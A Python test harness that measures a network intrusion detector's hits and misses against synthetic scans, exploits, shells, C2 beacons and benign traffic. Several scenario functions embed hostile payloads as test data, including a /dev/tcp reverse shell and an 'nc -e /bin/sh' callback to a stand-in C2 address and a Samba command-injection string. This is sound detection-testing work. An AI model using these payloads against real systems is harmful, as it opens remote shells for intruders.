"""Efficacy harness — TP / FP / FN per attack type, over synthetic traffic.

This is the automated successor to the manual efficacy testing that produced the
findings in docs/EFFICACY_FINDINGS.md. Every finding from that round has a case
here, so a regression shows up as a failing case rather than as a surprise
during the next round of manual testing.

    venv/Scripts/python.exe efficacy_harness.py            # table + exit code
    venv/Scripts/python.exe efficacy_harness.py --json     # machine-readable
    venv/Scripts/python.exe efficacy_harness.py -v         # per-case detail

Exit code is non-zero if any case fails, so it can gate a commit.

How a case is scored:

  TP  an expected rule fired
  FN  an expected rule did not fire
  FP  an alert above INFO fired in a scenario declared benign, OR a rule fired
      that the case explicitly forbade
  +   every alert is additionally checked for its discriminating features
      (rules.validate_alert_details) — a rule that fires with a generic,
      featureless detail dict FAILS even though it "detected" the attack. That
      check is what keeps the specificity work from silently rotting.
"""

import argparse
import json
import sys
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Set

from detection.pipeline import DetectionPipeline, PipelineConfig
from detection.reassembly import FragmentReassembler
from detection.rules import RULES, validate_alert_details

FIN, SYN, RST, PSH, ACK, URG = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20

KALI = "192.168.56.101"
TARGET = "192.168.56.102"
WORKSTATION = "192.168.56.20"
ADMIN = "192.168.56.10"
C2 = "203.0.113.50"
WEB = "93.184.216.34"

TARGET_BASELINE_PORTS = [21, 22, 23, 25, 80, 111, 139, 445, 512, 1099,
                         2121, 3306, 3632, 5432, 5900, 6667, 8180]

# A real TLS ClientHello opening: record type 22 (handshake), version 3.1,
# then handshake type 1. Every TLS version in use starts this way.
TLS_CLIENT_HELLO = bytes.fromhex("160301012c010001280303") + b"\x00" * 32


class Clock:
    def __init__(self, start=1_700_000_000.0):
        self.now = float(start)

    def __call__(self):
        return self.now

    def advance(self, s):
        self.now += float(s)
        return self.now


def new_pipeline(clock, authorized_scanners=(), **overrides):
    kwargs = dict(
        monitored_servers={TARGET},
        outbound_baseline={TARGET: set()},
        listening_baseline={TARGET: set(TARGET_BASELINE_PORTS)},
        authorized_scanners=set(authorized_scanners),
    )
    kwargs.update(overrides)
    return DetectionPipeline(PipelineConfig(**kwargs), clock=clock)


@dataclass
class Case:
    name: str
    category: str
    run: Callable                       # (pipe, clock) -> None
    expect: Set[str] = field(default_factory=set)   # rule_ids that MUST fire
    forbid: Set[str] = field(default_factory=set)   # rule_ids that must NOT fire
    benign: bool = False                # True: no alert above INFO at all
    expect_incident: Optional[bool] = None          # correlation expectation
    note: str = ""
    authorized_scanners: tuple = ()
    config: dict = field(default_factory=dict)   # PipelineConfig overrides


@dataclass
class Result:
    case: Case
    tp: List[str] = field(default_factory=list)
    fn: List[str] = field(default_factory=list)
    fp: List[str] = field(default_factory=list)
    detail_failures: List[str] = field(default_factory=list)
    incident_ok: bool = True
    incidents: int = 0
    fired: List[str] = field(default_factory=list)

    @property
    def passed(self) -> bool:
        return (not self.fn and not self.fp and not self.detail_failures
                and self.incident_ok)


# ──────────────────────────────────────────────────────────────────────────────
#  Scenario builders
# ──────────────────────────────────────────────────────────────────────────────
def _syn_sweep(pipe, clock, src, dst, ports, gap=0.05):
    for i, p in enumerate(ports):
        pipe.on_tcp_packet(src, dst, 40000 + i, p, SYN, ts=clock.now + i * gap)


def scan_syn(pipe, clock):
    _syn_sweep(pipe, clock, KALI, TARGET, [21, 22, 23, 25, 80, 110, 139, 445])


def scan_connect(pipe, clock):
    for i, p in enumerate([21, 22, 23, 25, 80, 110, 139, 445]):
        t = clock.now + i * 0.05
        pipe.on_tcp_packet(KALI, TARGET, 40000 + i, p, SYN, ts=t)
        pipe.on_tcp_packet(TARGET, KALI, p, 40000 + i, SYN | ACK, ts=t + 0.001)
        pipe.on_tcp_packet(KALI, TARGET, 40000 + i, p, ACK, ts=t + 0.002)


def _flag_scan(flags):
    def run(pipe, clock):
        for i, p in enumerate([21, 22, 80, 445]):
            pipe.on_tcp_packet(KALI, TARGET, 40000 + i, p, flags,
                               ts=clock.now + i * 0.05)
    return run


def scan_fragmented_fin(pipe, clock):
    """nmap -f -sF: the evasion that previously worked completely.

    Reassembles at the byte level (same core the live sensor uses) and feeds the
    rebuilt packet into the pipeline, proving the fragmented probe lands on the
    same rule as an unfragmented one.
    """
    try:
        from scapy.all import IP, TCP, fragment
    except ImportError:
        return
    r = FragmentReassembler(clock=clock)
    for i, port in enumerate([21, 22, 80, 445]):
        probe = IP(src=KALI, dst=TARGET, id=1000 + i) / TCP(
            sport=40000 + i, dport=port, flags="F")
        done = None
        for frag in fragment(probe, fragsize=8):
            ip = frag[IP]
            done = r.add_fragment(ip.src, ip.dst, int(ip.proto), int(ip.id),
                                  int(ip.frag), bool(int(ip.flags) & 0x01),
                                  bytes(ip.payload), ts=clock.now) or done
        assert done is not None, "fragmented probe failed to reassemble"
        rebuilt = IP(bytes(IP(src=done.src, dst=done.dst, proto=done.proto)
                           / done.payload))
        pipe.on_tcp_packet(rebuilt[IP].src, rebuilt[IP].dst,
                           int(rebuilt[TCP].sport), int(rebuilt[TCP].dport),
                           int(rebuilt[TCP].flags), ts=clock.now + i * 0.05,
                           fragment_count=done.fragment_count)


def bruteforce_standard(pipe, clock):
    for i in range(12):
        pipe.on_tcp_packet(KALI, TARGET, 45000 + i, 22, SYN,
                           ts=clock.now + i * 0.4)


def bruteforce_low_rate(pipe, clock):
    for i in range(10):
        pipe.on_tcp_packet(KALI, TARGET, 46000 + i, 22, SYN,
                           ts=clock.now + i * 45.0)


def exploit_vsftpd(pipe, clock):
    pipe.on_tcp_packet(KALI, TARGET, 47000, 21, PSH | ACK,
                       payload=b"USER backdoor:)\r\n", ts=clock.now)
    pipe.on_tcp_packet(KALI, TARGET, 47001, 6200, SYN, ts=clock.now + 2)


def exploit_samba(pipe, clock):
    payload = (b"\x00\x00\x00\xa4\xffSMBs\x00\x00\x00\x00"
               b"/=`nohup mkfifo /tmp/f; /bin/sh -i < /tmp/f`\x00")
    pipe.on_tcp_packet(KALI, TARGET, 47100, 445, PSH | ACK, payload=payload,
                       ts=clock.now)


def exploit_distcc(pipe, clock):
    payload = (b"DIST00000001ARGC00000005ARGV00000002shARGV00000002-c"
               b"ARGV0000001bnohup /bin/sh -i >& /dev/tcp/203.0.113.50/4444")
    pipe.on_tcp_packet(KALI, TARGET, 47200, 3632, PSH | ACK, payload=payload,
                       ts=clock.now)


def exploit_unrealircd(pipe, clock):
    pipe.on_tcp_packet(KALI, TARGET, 47300, 6667, PSH | ACK,
                       payload=b"AB;/bin/sh -c 'nc 203.0.113.50 4444 -e /bin/sh'\n",
                       ts=clock.now)


def exploit_java_rmi(pipe, clock):
    pipe.on_tcp_packet(KALI, TARGET, 47400, 1099, PSH | ACK,
                       payload=b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap",
                       ts=clock.now)


def tier2_reverse_shell(pipe, clock):
    pipe.on_tcp_packet(TARGET, C2, 50000, 4444, SYN, ts=clock.now)


def tier2_reverse_shell_unknown_exploit(pipe, clock):
    """No Tier 1 signature involved at all — the coverage claim, executed."""
    pipe.on_tcp_packet(TARGET, "198.51.100.77", 50001, 9001, SYN, ts=clock.now)


def tier2_bind_shell(pipe, clock):
    pipe.on_tcp_packet(KALI, TARGET, 47200, 3632, PSH | ACK,
                       payload=(b"DIST00000001ARGV00000002shARGV0000000b"
                                b"nohup /bin/sh -i"), ts=clock.now)
    pipe.on_tcp_packet(TARGET, KALI, 4444, 51000, SYN | ACK, ts=clock.now + 5)


def _type_commands(pipe, typist, typist_port, listener, listener_port, t0,
                   commands=15, keystroke=6, output=400, gap=2.0):
    """Simulate a human typing at a shell: tiny keystrokes, larger output back.

    Ports are passed explicitly per endpoint because the typist is NOT always the
    side that opened the connection — in a reverse shell the victim dials out and
    the attacker types back down it.
    """
    t = t0
    for _ in range(commands):
        for _ in range(6):
            t += 0.15
            pipe.on_tcp_packet(typist, listener, typist_port, listener_port,
                               PSH | ACK, payload_len=keystroke, ts=t)
        for _ in range(2):
            t += 0.05
            pipe.on_tcp_packet(listener, typist, listener_port, typist_port,
                               PSH | ACK, payload_len=output, ts=t)
        t += gap
    return t


def shell_on_443_no_baseline(pipe, clock):
    """THE GAP: workstation dials out to 443, attacker types. No baseline exists,
    and 443 is an allowed egress port, so every port-based rule misses it."""
    pipe.on_tcp_packet(WORKSTATION, C2, 51000, 443, SYN, ts=clock.now)
    _type_commands(pipe, C2, 443, WORKSTATION, 51000, clock.now)


def shell_on_443_with_strict_baseline(pipe, clock):
    """Same attack, but the workstation has a per-destination baseline. Now the
    callback itself is caught, before anyone types a single command."""
    pipe.on_tcp_packet(WORKSTATION, C2, 51000, 443, SYN, ts=clock.now)
    _type_commands(pipe, C2, 443, WORKSTATION, 51000, clock.now)


def bind_shell_interactive(pipe, clock):
    """Attacker connects IN to a shell and types. Opposite direction."""
    pipe.on_tcp_packet(KALI, TARGET, 52000, 4444, SYN, ts=clock.now)
    _type_commands(pipe, KALI, 52000, TARGET, 4444, clock.now)


def benign_legitimate_ssh(pipe, clock):
    """A real admin SSH session, confirmed by the host auth-log sensor.

    Identical in shape to a shell — because it IS one. Only the host-sensor
    correlation can separate them, and this asserts that it does.
    """
    pipe.shell.note_authorized_session(ADMIN, TARGET, ts=clock.now)
    pipe.on_tcp_packet(ADMIN, TARGET, 53000, 22, SYN, ts=clock.now)
    _type_commands(pipe, ADMIN, 53000, TARGET, 22, clock.now)


def benign_allowlisted_ssh(pipe, clock):
    """Same session, but vouched for by an assets.json standing exemption
    instead of by the host sensor."""
    pipe.on_tcp_packet(ADMIN, TARGET, 53100, 22, SYN, ts=clock.now)
    _type_commands(pipe, ADMIN, 53100, TARGET, 22, clock.now)


def benign_bulk_transfer(pipe, clock):
    """Same packet count as a shell, one direction, high throughput."""
    t = clock.now
    pipe.on_tcp_packet(WORKSTATION, TARGET, 54000, 21, SYN, ts=t)
    for _ in range(200):
        t += 0.01
        pipe.on_tcp_packet(TARGET, WORKSTATION, 21, 54000, PSH | ACK,
                           payload_len=1400, ts=t)


def tier2_beacon(pipe, clock):
    for i in range(9):
        pipe.on_tcp_packet(TARGET, C2, 52000 + i, 443, SYN,
                           ts=clock.now + i * 60.0, is_outbound=True)


def tier2_beacon_fixed_size(pipe, clock):
    """A beacon whose check-in request is the same size every time.

    Timing regularity plus payload-size regularity are two independent features
    agreeing, which is the strongest statement the beacon rule can make.
    """
    for i in range(9):
        t = clock.now + i * 60.0
        pipe.on_tcp_packet(TARGET, C2, 52000 + i, 443, SYN, ts=t,
                           is_outbound=True)
        pipe.on_tcp_packet(TARGET, C2, 52000 + i, 443, PSH | ACK,
                           payload=TLS_CLIENT_HELLO,
                           payload_len=412 + (i % 3), ts=t + 0.1,
                           is_outbound=True)


def c2_cleartext_on_443(pipe, clock):
    """An implant using 443 purely because egress filters allow it, without
    bothering to wrap the channel in real TLS. One data packet is enough."""
    pipe.on_tcp_packet(WORKSTATION, C2, 51500, 443, SYN, ts=clock.now)
    pipe.on_tcp_packet(WORKSTATION, C2, 51500, 443, PSH | ACK,
                       payload=bytes.fromhex("deadbeef0011223344556677"),
                       ts=clock.now + 0.2, is_outbound=True)


def cleartext_on_443_mid_session(pipe, clock):
    """THE FALSE-POSITIVE GUARD: the same cleartext bytes, but the sensor never
    saw the SYN. Mid-stream TLS is indistinguishable from cleartext on a
    first-byte test, so the rule must decline to render a verdict."""
    pipe.on_tcp_packet(WORKSTATION, C2, 51600, 443, PSH | ACK,
                       payload=bytes.fromhex("deadbeef0011223344556677"),
                       ts=clock.now, is_outbound=True)


def benign_real_https(pipe, clock):
    """Ordinary HTTPS: the handshake is right there in the first data packet."""
    for i in range(5):
        t = clock.now + i * 7.0
        pipe.on_tcp_packet(WORKSTATION, WEB, 55000 + i, 443, SYN, ts=t,
                           is_outbound=True)
        pipe.on_tcp_packet(WORKSTATION, WEB, 55000 + i, 443, PSH | ACK,
                           payload=TLS_CLIENT_HELLO, ts=t + 0.05,
                           is_outbound=True)


def benign_starttls_smtp(pipe, clock):
    """SMTP submission on 587 opens in CLEARTEXT and upgrades later — that is
    the protocol working correctly, so 587 must not be in the watched set."""
    pipe.on_tcp_packet(WORKSTATION, WEB, 55100, 587, SYN, ts=clock.now)
    pipe.on_tcp_packet(WORKSTATION, WEB, 55100, 587, PSH | ACK,
                       payload=b"EHLO workstation.lab.local\r\n",
                       ts=clock.now + 0.1, is_outbound=True)


def full_kill_chain(pipe, clock):
    _syn_sweep(pipe, clock, KALI, TARGET, [21, 22, 23, 25, 80, 110, 139, 445])
    clock.advance(30)
    for i in range(12):
        pipe.on_tcp_packet(KALI, TARGET, 45000 + i, 22, SYN,
                           ts=clock.now + i * 0.4)
    clock.advance(30)
    pipe.on_tcp_packet(KALI, TARGET, 47000, 21, PSH | ACK,
                       payload=b"USER backdoor:)\r\n", ts=clock.now)
    clock.advance(10)
    pipe.on_tcp_packet(KALI, TARGET, 47001, 6200, SYN, ts=clock.now)


# ── benign ────────────────────────────────────────────────────────────────────
def benign_subnet_service_check(pipe, clock):
    for i in range(1, 40):
        t = clock.now + i * 0.5
        host = f"192.168.56.{i}"
        pipe.on_tcp_packet(ADMIN, host, 40000 + i, 22, SYN, ts=t)
        pipe.on_tcp_packet(host, ADMIN, 22, 40000 + i, SYN | ACK, ts=t + 0.01)
        pipe.on_tcp_packet(ADMIN, host, 40000 + i, 22, ACK, ts=t + 0.02)


def benign_authorized_scan(pipe, clock):
    _syn_sweep(pipe, clock, ADMIN, TARGET,
               [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306])


def benign_failed_logins(pipe, clock):
    for i in range(3):
        pipe.on_tcp_packet(WORKSTATION, TARGET, 51000 + i, 22, SYN,
                           ts=clock.now + i * 12)


def benign_bursty_curl(pipe, clock):
    for i in range(60):
        t = clock.now + i * 0.1
        pipe.on_tcp_packet(WORKSTATION, WEB, 53000 + i, 443, SYN, ts=t,
                           is_outbound=True)
        pipe.on_tcp_packet(WEB, WORKSTATION, 443, 53000 + i, SYN | ACK, ts=t + 0.01)
        pipe.on_tcp_packet(WORKSTATION, WEB, 53000 + i, 443, ACK, ts=t + 0.02)


def benign_ssh_session(pipe, clock):
    # An interactive SSH session IS an interactive shell, so it only stays quiet
    # if something vouches for it. In a correctly deployed setup that is the host
    # auth-log sensor; this scenario models that.
    pipe.shell.note_authorized_session(WORKSTATION, TARGET, ts=clock.now)
    t = clock.now
    pipe.on_tcp_packet(WORKSTATION, TARGET, 56000, 22, SYN, ts=t)
    pipe.on_tcp_packet(TARGET, WORKSTATION, 22, 56000, SYN | ACK, ts=t + 0.01)
    pipe.on_tcp_packet(WORKSTATION, TARGET, 56000, 22, ACK, ts=t + 0.02)
    for i in range(200):
        pipe.on_tcp_packet(WORKSTATION, TARGET, 56000, 22, PSH | ACK,
                           payload=b"\x00" * 48, ts=t + 1 + i * 0.3)
        pipe.on_tcp_packet(TARGET, WORKSTATION, 22, 56000, PSH | ACK,
                           payload=b"\x00" * 96, ts=t + 1.1 + i * 0.3)


def benign_normal_ftp(pipe, clock):
    for i, line in enumerate([b"USER anonymous\r\n", b"PASS user@example.com\r\n",
                              b"SYST\r\n", b"PWD\r\n", b"LIST\r\n"]):
        pipe.on_tcp_packet(WORKSTATION, TARGET, 57000, 21, PSH | ACK,
                           payload=line, ts=clock.now + i)


def benign_normal_irc(pipe, clock):
    for i, line in enumerate([b"NICK tester\r\n", b"USER a b c :d\r\n",
                              b"JOIN #lab\r\n",
                              b"PRIVMSG #lab :hello AB world\r\n"]):
        pipe.on_tcp_packet(WORKSTATION, TARGET, 58000, 6667, PSH | ACK,
                           payload=line, ts=clock.now + i)


# ──────────────────────────────────────────────────────────────────────────────
#  Case list — one per efficacy finding
# ──────────────────────────────────────────────────────────────────────────────
CASES: List[Case] = [
    # ── Port scan ─────────────────────────────────────────────────────────────
    Case("SYN scan (nmap -sS)", "port_scan", scan_syn,
         expect={"TCP_SYN_SCAN"}, forbid={"TCP_CONNECT_SCAN"},
         note="was detected before; now names the technique"),
    Case("Connect scan (nmap -sT)", "port_scan", scan_connect,
         expect={"TCP_CONNECT_SCAN"}, forbid={"TCP_SYN_SCAN"},
         note="FINDING: -sS and -sT were indistinguishable"),
    Case("FIN scan (nmap -sF)", "port_scan", _flag_scan(FIN),
         expect={"TCP_FIN_SCAN"},
         forbid={"TCP_NULL_SCAN", "TCP_XMAS_SCAN"},
         note="FINDING: collapsed into a generic 'stealth scan'"),
    Case("NULL scan (nmap -sN)", "port_scan", _flag_scan(0x00),
         expect={"TCP_NULL_SCAN"}, forbid={"TCP_FIN_SCAN", "TCP_XMAS_SCAN"},
         note="FINDING: collapsed into a generic 'stealth scan'"),
    Case("XMAS scan (nmap -sX)", "port_scan", _flag_scan(FIN | PSH | URG),
         expect={"TCP_XMAS_SCAN"}, forbid={"TCP_FIN_SCAN", "TCP_NULL_SCAN"},
         note="FINDING: collapsed into a generic 'stealth scan'"),
    Case("Fragmented FIN scan (nmap -f)", "port_scan", scan_fragmented_fin,
         expect={"TCP_FIN_SCAN"},
         note="FINDING: evaded detection entirely - no reassembly"),

    # ── Brute force ───────────────────────────────────────────────────────────
    Case("Brute force, standard rate", "brute_force", bruteforce_standard,
         expect={"BRUTEFORCE_STANDARD_RATE"}, forbid={"BRUTEFORCE_LOW_RATE"},
         note="FINDING: same generic label as the slow variant"),
    Case("Brute force, low and slow", "brute_force", bruteforce_low_rate,
         expect={"BRUTEFORCE_LOW_RATE"}, forbid={"BRUTEFORCE_STANDARD_RATE"},
         note="FINDING: same generic label as the fast variant"),

    # ── Exploit Tier 1 ────────────────────────────────────────────────────────
    Case("vsftpd 2.3.4 backdoor", "exploit_tier1", exploit_vsftpd,
         expect={"EXPLOIT_VSFTPD_BACKDOOR", "EXPLOIT_VSFTPD_BACKDOOR_SHELL"},
         note="FINDING: zero exploit-stage detection existed"),
    Case("Samba usermap_script", "exploit_tier1", exploit_samba,
         expect={"EXPLOIT_SAMBA_USERMAP"},
         note="FINDING: zero exploit-stage detection existed"),
    Case("distccd command exec", "exploit_tier1", exploit_distcc,
         expect={"EXPLOIT_DISTCC_CMDEXEC"},
         note="FINDING: zero exploit-stage detection existed"),
    Case("UnrealIRCd backdoor", "exploit_tier1", exploit_unrealircd,
         expect={"EXPLOIT_UNREALIRCD_BACKDOOR"},
         note="FINDING: zero exploit-stage detection existed"),
    Case("Java RMI deserialization", "exploit_tier1", exploit_java_rmi,
         expect={"EXPLOIT_JAVA_RMI_DESERIALIZATION"},
         note="FINDING: zero exploit-stage detection existed"),

    # ── Exploit Tier 2 ────────────────────────────────────────────────────────
    Case("Reverse shell from server", "exploit_tier2", tier2_reverse_shell,
         expect={"BEHAVIOR_UNEXPECTED_OUTBOUND"},
         note="generalises beyond the five Tier 1 exploits"),
    Case("Reverse shell, UNKNOWN exploit", "exploit_tier2",
         tier2_reverse_shell_unknown_exploit,
         expect={"BEHAVIOR_UNEXPECTED_OUTBOUND"},
         forbid=set(r for r in RULES if r.startswith("EXPLOIT_")),
         note="COVERAGE CLAIM: detected with no payload signature involved"),
    Case("Bind shell (new listening port)", "exploit_tier2", tier2_bind_shell,
         expect={"BEHAVIOR_NEW_LISTENING_PORT"},
         note="baseline diff, exploit-agnostic"),
    Case("C2 beaconing", "exploit_tier2", tier2_beacon,
         expect={"BEHAVIOR_C2_BEACON"},
         note="interval-variance; payload and encryption irrelevant"),
    Case("C2 beaconing, fixed check-in size", "exploit_tier2",
         tier2_beacon_fixed_size,
         expect={"BEHAVIOR_C2_BEACON"},
         forbid={"BEHAVIOR_CLEARTEXT_ON_TLS_PORT"},
         note="timing AND size regular -> promoted; real TLS keeps the "
              "handshake rule quiet"),

    # ── No TLS handshake on a TLS port ───────────────────────────────────────
    Case("C2 on :443 with no TLS handshake", "tls_shape", c2_cleartext_on_443,
         expect={"BEHAVIOR_CLEARTEXT_ON_TLS_PORT"},
         note="verdict on the FIRST data packet; no baseline, no threshold"),
    Case("Same bytes, but SYN never seen", "tls_shape",
         cleartext_on_443_mid_session,
         forbid={"BEHAVIOR_CLEARTEXT_ON_TLS_PORT"},
         note="a sensor that joined mid-session must render no verdict"),

    # ── Shell on an allowed port — the hole found after the first round ──────
    Case("Shell on :443, host NOT baselined", "shell_access",
         shell_on_443_no_baseline,
         expect={"BEHAVIOR_INTERACTIVE_SHELL"},
         forbid={"BEHAVIOR_UNEXPECTED_OUTBOUND", "BEHAVIOR_UNCOMMON_EGRESS_PORT"},
         note="GAP: port-based rules cannot see this; only the shape can"),
    Case("Shell on :443, host baselined per-destination", "shell_access",
         shell_on_443_with_strict_baseline,
         expect={"BEHAVIOR_UNEXPECTED_OUTBOUND", "BEHAVIOR_INTERACTIVE_SHELL"},
         config={"outbound_baseline": {WORKSTATION: {("93.184.216.34", 443),
                                                     (None, 53)}}},
         note="a baseline catches the callback BEFORE anyone types"),
    Case("Bind shell, attacker typing inbound", "shell_access",
         bind_shell_interactive,
         expect={"BEHAVIOR_INTERACTIVE_SHELL"},
         note="same rule, opposite direction"),

    # ── Correlation ───────────────────────────────────────────────────────────
    Case("Full kill chain -> ONE incident", "correlation", full_kill_chain,
         expect={"CORRELATED_INCIDENT"}, expect_incident=True,
         note="FINDING: grouping logic was never specified"),

    # ── Benign ────────────────────────────────────────────────────────────────
    Case("Benign: subnet service check", "benign", benign_subnet_service_check,
         benign=True, expect_incident=False,
         note="FINDING: no regression test locked this in"),
    Case("Benign: authorized nmap (allowlisted)", "benign", benign_authorized_scan,
         benign=True, expect_incident=False, authorized_scanners=(ADMIN,),
         note="recorded at INFO, not suppressed"),
    Case("Benign: failed-login noise", "benign", benign_failed_logins,
         benign=True, expect_incident=False,
         note="FINDING: no regression test locked this in"),
    Case("Benign: bursty curl", "benign", benign_bursty_curl,
         benign=True, expect_incident=False,
         note="FINDING: no regression test locked this in"),
    Case("Benign: normal SSH session", "benign", benign_ssh_session,
         benign=True, expect_incident=False,
         note="FINDING: no regression test locked this in"),
    Case("Benign: normal FTP login", "benign", benign_normal_ftp,
         benign=True, expect_incident=False,
         note="negative case for the vsftpd signature"),
    Case("Benign: normal IRC chat", "benign", benign_normal_irc,
         benign=True, expect_incident=False,
         note="negative case for the UnrealIRCd signature"),
    Case("Benign: real SSH, host-sensor confirmed", "benign",
         benign_legitimate_ssh, benign=True, expect_incident=False,
         note="identical shape to a shell; only the login correlation separates them"),
    Case("Benign: real SSH, allowlisted pair (no host sensor)", "benign",
         benign_allowlisted_ssh, benign=True, expect_incident=False,
         config={"shell_authorized_pairs": {(ADMIN, TARGET)}},
         note="the escape hatch for hosts where host_log_sensor.py is absent"),
    Case("Benign: real HTTPS", "benign", benign_real_https,
         benign=True, expect_incident=False,
         note="negative case for the TLS-handshake rule"),
    Case("Benign: STARTTLS SMTP on :587", "benign", benign_starttls_smtp,
         benign=True, expect_incident=False,
         note="opening in cleartext is correct here; 587 is not a TLS port"),
    Case("Benign: bulk file transfer", "benign", benign_bulk_transfer,
         benign=True, expect_incident=False,
         note="negative case for the interactive-shell shape"),
]


# ──────────────────────────────────────────────────────────────────────────────
#  Runner
# ──────────────────────────────────────────────────────────────────────────────
def run_case(case: Case) -> Result:
    clock = Clock()
    pipe = new_pipeline(clock, case.authorized_scanners, **case.config)
    case.run(pipe, clock)

    res = Result(case=case)
    fired = {a["rule_id"] for a in pipe.published}
    res.fired = sorted(fired)
    res.incidents = pipe.correlator.incident_count()

    for rule_id in sorted(case.expect):
        (res.tp if rule_id in fired else res.fn).append(rule_id)

    for rule_id in sorted(case.forbid & fired):
        res.fp.append(f"{rule_id} (explicitly forbidden)")

    if case.benign:
        for a in pipe.alerts_above("info"):
            res.fp.append(f"{a['rule_id']} @ {a['severity']}")

    # Discriminating-feature check: detecting is not enough if the alert is
    # generic. Only catalogue rules are checked; legacy pass-through types are
    # exempt because they have no declared discriminators.
    for a in pipe.published:
        if a["rule_id"] not in RULES:
            continue
        missing = validate_alert_details(a["rule_id"], a["details"])
        if missing:
            res.detail_failures.append(f"{a['rule_id']} missing {missing}")

    if case.expect_incident is not None:
        res.incident_ok = (res.incidents > 0) == case.expect_incident

    return res


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="show every rule that fired per case")
    args = ap.parse_args(argv)

    results = [run_case(c) for c in CASES]

    if args.json:
        print(json.dumps({
            "cases": [{
                "name": r.case.name, "category": r.case.category,
                "passed": r.passed, "tp": r.tp, "fn": r.fn, "fp": r.fp,
                "detail_failures": r.detail_failures,
                "incidents": r.incidents, "fired": r.fired,
                "note": r.case.note,
            } for r in results],
            "totals": _totals(results),
        }, indent=2))
        return 0 if all(r.passed for r in results) else 1

    _print_table(results, args.verbose)
    return 0 if all(r.passed for r in results) else 1


def _totals(results):
    return {
        "cases": len(results),
        "passed": sum(1 for r in results if r.passed),
        "failed": sum(1 for r in results if not r.passed),
        "true_positives": sum(len(r.tp) for r in results),
        "false_negatives": sum(len(r.fn) for r in results),
        "false_positives": sum(len(r.fp) for r in results),
        "generic_alert_failures": sum(len(r.detail_failures) for r in results),
    }


def _print_table(results, verbose):
    width = max(len(r.case.name) for r in results) + 2
    category = None
    print()
    print("=" * (width + 40))
    print("NIDS RULE EFFICACY".center(width + 40))
    print("=" * (width + 40))
    for r in results:
        if r.case.category != category:
            category = r.case.category
            print(f"\n-- {category.upper().replace('_', ' ')} " +
                  "-" * (width + 36 - len(category)))
        status = "PASS" if r.passed else "FAIL"
        print(f"  [{status}] {r.case.name:<{width}} "
              f"TP={len(r.tp)} FN={len(r.fn)} FP={len(r.fp)} "
              f"INC={r.incidents}")
        if r.case.note:
            print(f"         {r.case.note}")
        if verbose and r.fired:
            print(f"         fired: {', '.join(r.fired)}")
        for f in r.fn:
            print(f"         FN: expected {f}, did not fire")
        for f in r.fp:
            print(f"         FP: {f}")
        for f in r.detail_failures:
            print(f"         GENERIC ALERT: {f}")
        if not r.incident_ok:
            expected = "an incident" if r.case.expect_incident else "no incident"
            print(f"         CORRELATION: expected {expected}, "
                  f"got {r.incidents}")

    t = _totals(results)
    print()
    print("=" * (width + 40))
    print(f"  cases {t['passed']}/{t['cases']} passed   "
          f"TP={t['true_positives']}  FN={t['false_negatives']}  "
          f"FP={t['false_positives']}  "
          f"generic-alert failures={t['generic_alert_failures']}")
    print("=" * (width + 40))
    print("\nSCOPE: network-only detection. Nothing here demonstrates host,")
    print("process or EDR visibility, and no case should be read as proving it.")
    print()


if __name__ == "__main__":
    sys.exit(main())
